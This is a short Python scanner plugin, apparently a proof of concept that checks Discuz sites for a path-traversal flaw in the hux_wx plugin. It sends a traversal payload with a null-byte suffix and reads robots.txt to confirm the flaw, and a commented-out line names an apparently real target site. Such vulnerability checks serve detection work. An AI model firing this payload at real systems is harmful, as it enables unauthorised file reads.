#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_Author_= Yuku
#_Refer_ = http://www.wooyun.org/bugs/wooyun-2010-079517
import requests
def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    payload = 'plugin.php?id=hux_wx:hux_wx&uid=1&mod=../../../..&ac=robots.txt%00'
    url = arg + payload
    try:
        req = requests.get(url, timeout=5)
        if req.status_code == 200 and "User-agent" in req.content:
            security_hole(url)
    except requests.Timeout:
        pass

# if __name__ == '__main__':
#     from dummy import *
#     audit(assign('discuz', 'http://www.yingji8.com/')[1])
from hackhttp import hackhttp
from func import *